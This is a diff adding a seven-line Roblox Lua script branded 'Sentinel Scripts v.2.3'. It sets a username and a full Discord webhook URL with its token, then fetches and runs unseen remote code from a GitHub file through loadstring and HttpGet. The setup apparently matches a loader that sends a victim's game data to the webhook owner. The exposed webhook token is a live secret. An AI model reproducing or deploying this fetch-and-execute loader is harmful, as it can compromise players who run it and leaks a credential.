@@ -1,0 +1,7 @@
+_G.Username = "Tristdidntdoit"
+
+_G.HubName = "Sentinel Scripts v.2.3"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1098601055396319262/AzBGc_71B9H06PHjsgFxYudCuKb5NFgucRGQAKNLsB-hVehsfsPgoDeXyFVkoHowzRhi"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
